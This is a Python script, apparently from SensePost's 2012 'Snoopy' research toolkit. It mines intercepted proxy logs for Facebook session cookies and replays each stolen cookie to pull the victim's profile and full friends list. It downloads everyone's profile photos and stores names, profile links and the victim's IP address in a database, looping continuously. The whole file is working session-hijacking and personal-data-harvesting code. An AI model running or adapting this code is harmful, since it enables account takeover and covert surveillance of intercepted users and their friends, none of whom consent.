#!/usr/bin/python
# glenn@sensepost.com 
# Snoopy // 2012
# By using this code you agree to abide by the supplied LICENSE.txt

# This script will go through web logs looking for Facebook cookies, and extract user details along
# with all of their friends.

import sys
import os
import stawk_db
import re
import time
import requests
import json
from urllib import urlretrieve
import logging

def do_fb(snoopyDir):
	global cursor	

	cursor.execute("SELECT get_fb_from_squid.c_user,get_fb_from_squid.cookies,get_fb_from_squid.client_ip FROM get_fb_from_squid LEFT JOIN facebook ON facebook.degree = 0 AND get_fb_from_squid.c_user = facebook.id WHERE facebook.id IS NULL")
	results=cursor.fetchall()

	for row in results:
		id,cookie,ip=row[0],row[1],row[2]	
		# Get info on the intercepted user
		url='http://graph.facebook.com/%s'%(id)
		cj={}
		headers={"User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)", "Cookie":cookie}
#		for a in cookie.split(';'):
#			k,v=a.split('=')
#			cj[k]=v
#		r = requests.get(url,cookies=cj,headers=headers)
		r = requests.get(url,headers=headers)
		res=json.loads(r.text)		
		ud={'id':'','name':'','first_name':'','last_name':'','link':'','username':'','gender':'','locale':''}

#		intersect = filter(fields.has_key, res.keys())
#		for k in intersect:
#			ud[k]=res[k]

		for r in res:
			if r in ud:
				ud[r]=res[r]

		# Grab profile photo
		if not os.path.exists("%s/web_data/facebook/%s"%(snoopyDir,id)) and not os.path.isdir("%s/web_data/facebook/%s"%(snoopyDir,id)):
			os.makedirs("%s/web_data/facebook/%s"%(snoopyDir,id))
		urlretrieve('http://graph.facebook.com/%s/picture'%id, '%s/web_data/facebook/%s/profile.jpg'%(snoopyDir,id))

		logging.info("New user observed! - %s" %ud['name'])
		logging.info(ud)


		cursor.execute("INSERT IGNORE INTO facebook (ip,id,name,first_name,last_name,link,username,gender,locale,degree) VALUES(%s,%s,%s,%s,%s,%s,%s,%s,%s,0)", (ip,ud['id'],ud['name'],ud['first_name'],ud['last_name'],ud['link'],ud['username'],ud['gender'],ud['locale']))
		

		# Pull his friends list
		url='http://www.facebook.com/ajax/typeahead_friends.php?__a=1&u=%s' %(id)
		r = requests.get(url,cookies=cj,headers=headers)
		res=json.loads(re.sub("for \(;;\);","",r.text))
		friends=res['payload']['friends']

		for friend in friends:
			#Grab their profile photo
	                if not os.path.exists("%s/web_data/facebook/%s"%(snoopyDir,friend['i'])) and not os.path.isdir("%s/web_data/facebook/%s"%(snoopyDir,friend['i'])):
				logging.info("making dir %s/web_data/facebook/%s"%(snoopyDir,friend['i']))
                        	os.makedirs("%s/web_data/facebook/%s"%(snoopyDir,friend['i']))
			else:
				logging.info("Dir exists")

			urlretrieve('http://graph.facebook.com/%s/picture'%friend['i'], '%s/web_data/facebook/%s/profile.jpg'%(snoopyDir,friend['i']))
			cursor.execute("INSERT IGNORE INTO facebook(id,name,link,network,it,degree) VALUES(%s,%s,%s,%s,%s,1)", (friend['i'], friend['t'],friend['u'],friend['n'],friend['it']))
			cursor.execute("INSERT IGNORE INTO facebook_friends (id,friend_id) VALUES(%s,%s)", (id,friend['i']))

def db():
	global cursor
	cursor=stawk_db.dbconnect()

def main(snoopyDir):
	logging.info("Starting Facebook stalker")
	db()


#####REMOVE POST TESTING
	while True:
		do_fb(snoopyDir)
		time.sleep(5)


#TESTGING
#	while True:
#		try:
#			do_fb(snoopyDir)
#		except Exception, e:
#			logging.error("Something bad happened")
#			logging.error(e)
#			db()
#		time.sleep(5)

if __name__ == "__main__":
	logging.basicConfig(level=logging.INFO,format='%(asctime)s %(levelname)s %(filename)s: %(message)s',datefmt='%Y-%m-%d %H:%M:%S')
	main(sys.argv[1])
